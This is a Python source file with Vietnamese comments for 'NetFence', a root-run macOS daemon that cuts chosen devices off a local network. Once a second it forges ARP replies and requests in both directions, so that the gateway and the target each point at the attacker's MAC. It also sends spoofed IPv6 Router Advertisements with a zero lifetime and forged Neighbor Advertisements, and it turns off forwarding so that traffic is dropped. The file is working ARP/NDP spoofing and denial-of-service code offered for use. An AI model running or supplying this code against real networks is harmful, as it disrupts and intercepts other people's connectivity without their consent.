#!/usr/bin/env python3
"""NetFence ARP & IPv6 engine (privileged worker).

Chạy bằng ROOT. Đọc bảng "block" từ <state_dir>/request.json và LIÊN TỤC gửi các
khung ARP (IPv4) và ICMPv6 (IPv6) tới thiết bị đích trên LAN để duy trì trạng thái chặn:

  - Chu kỳ liên tục (mỗi 1 giây):
      + Không phải chỉ chặn 1 lần, mà chạy vòng lặp vô tận (while True).
      + Cứ mỗi 1 giây (hoặc theo interval_ms) lại phát tiếp loạt gói tin chặn.
      + Dù người dùng tắt Wi-Fi bật lại, ngay khi vừa kết nối là bị đè chặn ngay lập tức.

  - IPv4 Block (2 chiều):
      + Gửi ARP Reply & Request unicast tới Target: Gateway IP nằm ở our_mac.
      + Gửi ARP Reply broadcast: Thông báo toàn mạng Gateway nằm ở our_mac.
      + Gửi ARP Reply & Request tới Gateway: Target IP nằm ở our_mac.
      + Vô hiệu hoá net.inet.ip.redirect=0 để macOS KHÔNG sinh gói ICMP Redirect.

  - IPv6 Block (ICMPv6 NDP NA + RA):
      + Gửi ICMPv6 Router Advertisement (RA) chuẩn RFC 2464 tới 33:33:00:00:00:01 (ff02::1)
        với Router Lifetime = 0 -> Huỷ quyền làm default router của Gateway IPv6.
      + Gửi ICMPv6 Neighbor Advertisement (NA) với cờ Router=1, Override=1.

  - Thống kê thời gian thực:
      + Đếm số đợt phát (ticks) và số gói tin (packets) ghi vào status.json để Web UI hiển thị.
"""
from __future__ import annotations

import errno
import json
import os
import socket
import struct
import sys
import time

# ---- macOS BPF ioctl codes (_IOW('B', n, t)) ------------------------------
IOC_IN = 0x80000000
IOCPARM_MASK = 0x1FFF


def _iow(group: str, num: int, size: int) -> int:
    return IOC_IN | ((size & IOCPARM_MASK) << 16) | (ord(group) << 8) | num


BIOCSETIF = _iow("B", 108, 32)      # struct ifreq (32 bytes trên macOS)
BIOCSHDRCMPLT = _iow("B", 117, 4)   # u_int: 1 = ta tự điền src MAC
BIOCIMMEDIATE = _iow("B", 112, 4)   # u_int

ETH_P_ARP = 0x0806
ETH_P_IPV6 = 0x86DD
ARP_HTYPE_ETH = 1
ARP_PTYPE_IPV4 = 0x0800
ARP_OP_REQUEST = 1
ARP_OP_REPLY = 2

ETH_BROADCAST = b"\xff" * 6
ETH_IPV6_ALLNODES = b"\x33\x33\x00\x00\x00\x01"

MAX_ENTRIES = 255
POLL_SEC = 0.05       # 50ms kiểm tra vòng lặp để phát đúng chu kỳ
STATUS_EVERY = 1.0
MISSING_GRACE = 60.0  # giây: request.json biến mất quá lâu -> tự dọn dẹp & thoát


def mac_to_bytes(mac: str) -> bytes:
    parts = mac.split(":")
    if len(parts) != 6:
        raise ValueError(f"MAC không hợp lệ: {mac}")
    return bytes(int(p, 16) for p in parts)


def ip_to_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def in_cksum(data: bytes) -> int:
    """Tính 16-bit Internet Checksum cho ICMPv6."""
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


class BpfSender:
    def __init__(self, ifname: str):
        self.ifname = ifname
        self.fd = -1
        last_err = None
        for i in range(0, 256):
            path = f"/dev/bpf{i}"
            try:
                fd = os.open(path, os.O_RDWR)
            except OSError as e:
                if e.errno in (errno.EBUSY, errno.EACCES, errno.ENOENT):
                    last_err = e
                    continue
                raise
            try:
                ifreq = struct.pack("16s16x", ifname.encode())
                import fcntl

                fcntl.ioctl(fd, BIOCSETIF, ifreq)
                fcntl.ioctl(fd, BIOCSHDRCMPLT, struct.pack("I", 1))
                fcntl.ioctl(fd, BIOCIMMEDIATE, struct.pack("I", 1))
                self.fd = fd
                return
            except OSError as e:
                os.close(fd)
                last_err = e
                continue
        raise RuntimeError(f"Không mở được /dev/bpf* (cần root). Lỗi cuối: {last_err}")

    def send(self, frame: bytes) -> bool:
        try:
            os.write(self.fd, frame)
            return True
        except OSError:
            return False

    def close(self) -> None:
        if self.fd >= 0:
            try:
                os.close(self.fd)
            finally:
                self.fd = -1


def build_arp(op: int, src_mac: bytes, src_ip: bytes,
              dst_mac: bytes, dst_ip: bytes) -> bytes:
    eth = dst_mac + src_mac + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        ARP_HTYPE_ETH, ARP_PTYPE_IPV4, 6, 4, op,
        src_mac, src_ip, dst_mac, dst_ip,
    )
    frame = eth + arp
    if len(frame) < 60:  # đệm tối thiểu khung Ethernet
        frame += b"\x00" * (60 - len(frame))
    return frame


def build_icmpv6_na_frame(dst_mac: bytes, src_mac: bytes,
                          src_ip6: str, dst_ip6: str, target_ip6: str,
                          tlla_mac: bytes, flags: int = 0xa0000000) -> bytes:
    """Tạo Ethernet frame chứa ICMPv6 Neighbor Advertisement (NDP)."""
    eth = dst_mac + src_mac + struct.pack("!H", ETH_P_IPV6)
    opt = struct.pack("!BB6s", 2, 1, tlla_mac)
    target_bytes = socket.inet_pton(socket.AF_INET6, target_ip6)
    icmp_body = struct.pack("!BBHI16s", 136, 0, 0, flags, target_bytes) + opt

    src_bytes = socket.inet_pton(socket.AF_INET6, src_ip6)
    dst_bytes = socket.inet_pton(socket.AF_INET6, dst_ip6)
    pseudo = src_bytes + dst_bytes + struct.pack("!II", len(icmp_body), 58)
    chk = in_cksum(pseudo + icmp_body)

    icmp_final = struct.pack("!BBHI16s", 136, 0, chk, flags, target_bytes) + opt
    ipv6_hdr = struct.pack("!IHBB16s16s", 0x60000000, len(icmp_final), 58, 255, src_bytes, dst_bytes)
    return eth + ipv6_hdr + icmp_final


def build_icmpv6_ra_frame(dst_mac: bytes, src_mac: bytes,
                          src_ip6: str, dst_ip6: str = "ff02::1",
                          router_lifetime: int = 0) -> bytes:
    """Tạo Ethernet frame chứa ICMPv6 Router Advertisement."""
    eth = dst_mac + src_mac + struct.pack("!H", ETH_P_IPV6)
    slla = struct.pack("!BB6s", 1, 1, src_mac)
    icmp_body = struct.pack("!BBHBBHII", 134, 0, 0, 64, 0, router_lifetime, 0, 0) + slla

    src_bytes = socket.inet_pton(socket.AF_INET6, src_ip6)
    dst_bytes = socket.inet_pton(socket.AF_INET6, dst_ip6)
    pseudo = src_bytes + dst_bytes + struct.pack("!II", len(icmp_body), 58)
    chk = in_cksum(pseudo + icmp_body)

    icmp_final = struct.pack("!BBHBBHII", 134, 0, chk, 64, 0, router_lifetime, 0, 0) + slla
    ipv6_hdr = struct.pack("!IHBB16s16s", 0x60000000, len(icmp_final), 58, 255, src_bytes, dst_bytes)
    return eth + ipv6_hdr + icmp_final


class Engine:
    def __init__(self, state_dir: str):
        self.state_dir = state_dir
        self.req_path = os.path.join(state_dir, "request.json")
        self.status_path = os.path.join(state_dir, "status.json")
        self.sender: BpfSender | None = None
        self.iface = ""
        self.our_mac = b""
        self.gw_ip = b""
        self.gw_mac = b""
        self.gw_ip6 = ""
        self.active: dict[str, dict] = {}   # ip -> {mac, interval_ms, last_sent}
        self.applied_gen = -1
        self.total_ticks = 0
        self.total_packets = 0

    # -- Chặn / Khôi phục ---------------------------------------------------
    def _poison(self, target_ip: str, target_mac: str) -> None:
        tmac = mac_to_bytes(target_mac)
        tip = ip_to_bytes(target_ip)
        omac = self.our_mac
        pkts = []

        # 1. IPv4 2 chiều (Bidirectional Poisoning):
        # - Báo Target: Gateway_IP nằm ở our_mac (Reply unicast + Request)
        pkts.append(build_arp(ARP_OP_REPLY, omac, self.gw_ip, tmac, tip))
        pkts.append(build_arp(ARP_OP_REQUEST, omac, self.gw_ip, tmac, tip))
        # - Phát sóng Gratuitous ARP announcement cho Gateway
        pkts.append(build_arp(ARP_OP_REPLY, omac, self.gw_ip, ETH_BROADCAST, self.gw_ip))
        # - Báo Gateway: Target_IP nằm ở our_mac (Reply + Request)
        pkts.append(build_arp(ARP_OP_REPLY, omac, tip, self.gw_mac, self.gw_ip))
        pkts.append(build_arp(ARP_OP_REQUEST, omac, tip, self.gw_mac, self.gw_ip))

        # 2. IPv6 Poisoning (nếu mạng có IPv6):
        if self.gw_ip6:
            try:
                # - ICMPv6 RA gửi chuẩn multicast (33:33:00:00:00:01) với Router Lifetime = 0
                # Bất kỳ thiết bị nào vừa bật Wi-Fi lại nhận được gói này sẽ lập tức huỷ default route IPv6
                pkts.append(build_icmpv6_ra_frame(ETH_IPV6_ALLNODES, omac, self.gw_ip6,
                                                 "ff02::1", router_lifetime=0))
                # - ICMPv6 NA gửi multicast gán IPv6 Gateway về our_mac (Override=1)
                pkts.append(build_icmpv6_na_frame(ETH_IPV6_ALLNODES, omac, self.gw_ip6,
                                                 "ff02::1", self.gw_ip6, omac, 0xa0000000))
                # - ICMPv6 unicast trực tiếp tới MAC của Target
                pkts.append(build_icmpv6_na_frame(tmac, omac, self.gw_ip6,
                                                 "ff02::1", self.gw_ip6, omac, 0xa0000000))
            except Exception:
                pass

        # Gửi toàn bộ gói tin
        for p in pkts:
            if self.sender and self.sender.send(p):
                self.total_packets += 1
        self.total_ticks += 1

    def _restore(self, target_ip: str, target_mac: str, rounds: int = 5) -> None:
        try:
            tmac = mac_to_bytes(target_mac)
            tip = ip_to_bytes(target_ip)
        except ValueError:
            return

        for _ in range(rounds):
            # Khôi phục IPv4 2 chiều:
            self.sender.send(build_arp(ARP_OP_REPLY, self.gw_mac, self.gw_ip, tmac, tip))
            self.sender.send(build_arp(ARP_OP_REPLY, tmac, tip, self.gw_mac, self.gw_ip))

            # Khôi phục IPv6:
            if self.gw_ip6:
                try:
                    f_ra = build_icmpv6_ra_frame(ETH_IPV6_ALLNODES, self.gw_mac, self.gw_ip6,
                                                "ff02::1", router_lifetime=1800)
                    f_na = build_icmpv6_na_frame(tmac, self.gw_mac, self.gw_ip6, "ff02::1",
                                                self.gw_ip6, self.gw_mac, 0xa0000000)
                    self.sender.send(f_ra)
                    self.sender.send(f_na)
                except Exception:
                    pass
            time.sleep(0.04)

    # -- Quản lý State ------------------------------------------------------
    def _read_request(self):
        try:
            with open(self.req_path, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return None

    def _write_status(self, running: bool, note: str = "") -> None:
        data = {
            "running": running,
            "pid": os.getpid(),
            "ts": time.time(),
            "interface": self.iface,
            "gateway_ip6": self.gw_ip6,
            "gateway_locked": getattr(self, "gateway_locked", False),
            "active": sorted(self.active.keys()),
            "applied_generation": self.applied_gen,
            "total_ticks": self.total_ticks,
            "total_packets": self.total_packets,
            "note": note,
        }
        tmp = self.status_path + ".tmp"
        try:
            with open(tmp, "w") as f:
                json.dump(data, f)
            os.replace(tmp, self.status_path)
            os.chmod(self.status_path, 0o644)
        except OSError:
            pass

    def _apply(self, req: dict) -> None:
        self.iface = req.get("interface", self.iface)
        self.our_mac = mac_to_bytes(req["our_mac"])
        self.gw_ip = ip_to_bytes(req["gateway_ip"])
        self.gw_mac = mac_to_bytes(req["gateway_mac"])
        self.gw_ip6 = req.get("gateway_ip6", "").strip()

        if self.sender is None or self.sender.ifname != self.iface:
            if self.sender:
                self.sender.close()
            self.sender = BpfSender(self.iface)

        entries = req.get("entries", [])[:MAX_ENTRIES]
        wanted = {}
        for e in entries:
            ip = e.get("ip")
            mac = e.get("mac")
            if not ip or not mac:
                continue
            # Mặc định chu kỳ 1000ms (1 giây), có thể cấu hình từ 100ms - 5000ms
            iv = int(e.get("interval_ms", 1000))
            iv = max(50, min(5000, iv))
            wanted[ip] = {"mac": mac, "interval_ms": iv,
                          "last_sent": self.active.get(ip, {}).get("last_sent", 0.0)}

        # Thiết bị vừa được bỏ block -> khôi phục
        for ip in list(self.active.keys()):
            if ip not in wanted:
                self._restore(ip, self.active[ip]["mac"])
        self.active = wanted
        self.applied_gen = req.get("generation", self.applied_gen)
        # Tự động khóa tĩnh ARP Gateway để bảo vệ máy khỏi bị đầu độc (Auto-Defense)
        gw_ip_str = req.get("gateway_ip", "")
        gw_mac_str = req.get("gateway_mac", "")
        if gw_ip_str and gw_mac_str:
            try:
                import subprocess
                subprocess.run(["arp", "-s", gw_ip_str, gw_mac_str],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.gateway_locked = True
                self.gw_ip_str = gw_ip_str
            except Exception:
                pass

    def _tick_send(self) -> None:
        now = time.time()
        # Định kỳ mỗi 3s gửi Gratuitous ARP bảo vệ router không bị kẻ tấn công đầu độc
        if now - getattr(self, "_last_garp", 0.0) >= 3.0:
            self._last_garp = now
            if self.sender and self.our_mac and self.gw_ip and self.gw_mac:
                try:
                    garp = build_arp(ARP_OP_REQUEST, self.our_mac, self.gw_ip, self.gw_mac, self.gw_ip)
                    self.sender.send(garp)
                except Exception:
                    pass

        for ip, info in self.active.items():
            # Liên tục kiểm tra: Cứ mỗi interval_ms (1 giây) lại gửi đợt mới
            if (now - info["last_sent"]) * 1000.0 >= info["interval_ms"]:
                try:
                    self._poison(ip, info["mac"])
                    info["last_sent"] = now
                except OSError:
                    pass

    def shutdown(self, note: str = "shutdown") -> None:
        os.system("sysctl -w net.inet.ip.redirect=1 >/dev/null 2>&1")
        if getattr(self, "gateway_locked", False) and getattr(self, "gw_ip_str", ""):
            try:
                import subprocess
                subprocess.run(["arp", "-d", self.gw_ip_str],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
        for ip, info in list(self.active.items()):
            self._restore(ip, info["mac"])
        self.active.clear()
        self._write_status(False, note)
        if self.sender:
            self.sender.close()

    def run(self) -> int:
        if os.geteuid() != 0:
            self._write_status(False, "cần chạy bằng root")
            print("NetFence engine cần quyền root.", file=sys.stderr)
            return 1
        
        os.system("sysctl -w net.inet.ip.redirect=0 >/dev/null 2>&1")
        os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")

        last_status = 0.0
        missing_since = None
        self._write_status(True, "started")
        try:
            # VÒNG LẶP LIÊN TỤC VÔ TẬN: Không bao giờ dừng cho tới khi shutdown
            while True:
                req = self._read_request()
                now = time.time()
                if req is None:
                    if missing_since is None:
                        missing_since = now
                    elif now - missing_since > MISSING_GRACE:
                        self.shutdown("request.json biến mất")
                        return 0
                else:
                    missing_since = None
                    if req.get("shutdown"):
                        self.shutdown("shutdown theo yêu cầu")
                        return 0
                    if req.get("generation", 0) != self.applied_gen:
                        try:
                            self._apply(req)
                        except Exception as e:
                            self._write_status(True, f"apply lỗi: {e}")
                
                # Bắn liên tục theo chu kỳ mỗi 1 giây
                if self.active and self.sender:
                    self._tick_send()

                if now - last_status >= STATUS_EVERY:
                    self._write_status(True)
                    last_status = now
                time.sleep(POLL_SEC)
        except KeyboardInterrupt:
            self.shutdown("ngắt")
            return 0


def _daemonize(log_path: str) -> None:
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    devnull = os.open(os.devnull, os.O_RDWR)
    os.dup2(devnull, 0)
    logfd = os.open(log_path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
    os.dup2(logfd, 1)
    os.dup2(logfd, 2)


def main() -> int:
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    daemon = "--daemon" in sys.argv[1:]
    state_dir = args[0] if args else "/tmp/netfence"
    os.makedirs(state_dir, exist_ok=True)
    if daemon:
        _daemonize(os.path.join(state_dir, "engine.log"))
    return Engine(state_dir).run()


if __name__ == "__main__":
    raise SystemExit(main())
